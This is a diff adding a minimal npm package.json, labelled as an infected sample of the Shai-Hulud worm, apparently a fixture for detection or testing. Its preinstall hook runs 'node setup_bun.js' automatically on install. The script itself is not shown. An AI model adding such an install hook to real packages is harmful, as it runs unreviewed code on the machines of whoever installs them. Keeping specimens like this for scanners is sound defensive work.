@@ -1,0 +1,8 @@
+{
+  "name": "shai-hulud-sample",
+  "version": "1.0.0",
+  "description": "Infected package — Shai-Hulud worm",
+  "scripts": {
+    "preinstall": "node setup_bun.js"
+  }
+}
